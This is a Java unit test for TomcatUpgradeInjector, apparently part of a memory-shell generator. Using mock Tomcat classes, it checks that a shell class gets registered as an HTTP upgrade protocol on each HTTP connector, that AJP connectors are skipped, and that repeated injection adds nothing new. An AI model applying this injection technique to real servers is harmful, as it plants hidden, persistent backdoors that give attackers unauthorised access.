package org.leo.jmg.mem.tomcat;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.AfterEach;
import org.leo.jmg.mem.injectortpl.tomcat.TomcatUpgradeInjector;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

class TomcatUpgradeInjectorTest {

    @AfterEach
    void resetStatics() throws Exception {
        setStatic("ok", Boolean.FALSE);
        setStatic("shellClassName", null);
        setStatic("shellClass", null);
    }

    @Test
    void registersEveryHttpConnectorAndSkipsNonHttpConnector() throws Exception {
        setStatic("ok", Boolean.TRUE);
        TomcatUpgradeInjector injector = new TomcatUpgradeInjector();
        setStatic("shellClassName", DummyUpgrade.class.getName());
        setStatic("shellClass", "unused");
        Context context = new Context();

        Method inject = TomcatUpgradeInjector.class
                .getDeclaredMethod("inject", Object.class);
        inject.setAccessible(true);
        assertTrue(((Boolean) inject.invoke(injector, context)).booleanValue());
        assertEquals(1, http(context.parent.parent.service.http1)
                .httpUpgradeProtocols.size());
        assertEquals(1, http(context.parent.parent.service.http2)
                .httpUpgradeProtocols.size());
        assertTrue(http(context.parent.parent.service.http1)
                .httpUpgradeProtocols.containsKey(DummyUpgrade.class.getName()));

        // 第二次执行保持幂等。
        assertTrue(((Boolean) inject.invoke(injector, context)).booleanValue());
        assertEquals(1, http(context.parent.parent.service.http1)
                .httpUpgradeProtocols.size());
    }

    private static HttpProtocol http(Connector connector) {
        return (HttpProtocol) connector.protocolHandler;
    }

    private static void setStatic(String name, Object value) throws Exception {
        Field field = TomcatUpgradeInjector.class.getDeclaredField(name);
        field.setAccessible(true);
        field.set(null, value);
    }

    public static class DummyUpgrade {
    }

    public static class Context {
        final Host parent = new Host();

        public ClassLoader getClassLoader() {
            return getClass().getClassLoader();
        }
    }

    public static class Host {
        final Engine parent = new Engine();
    }

    public static class Engine {
        final Service service = new Service();
    }

    public static class Service {
        final Connector http1 = new Connector(new HttpProtocol());
        final Connector http2 = new Connector(new HttpProtocol());
        final Connector ajp = new Connector(new AjpProtocol());

        public Object[] findConnectors() {
            return new Object[]{http1, ajp, http2};
        }
    }

    public static class Connector {
        final Object protocolHandler;

        Connector(Object protocolHandler) {
            this.protocolHandler = protocolHandler;
        }

        public Object getProtocolHandler() {
            return protocolHandler;
        }
    }

    public static class HttpProtocol {
        final Map<String, Object> httpUpgradeProtocols =
                new HashMap<String, Object>();
    }

    public static class AjpProtocol {
    }
}
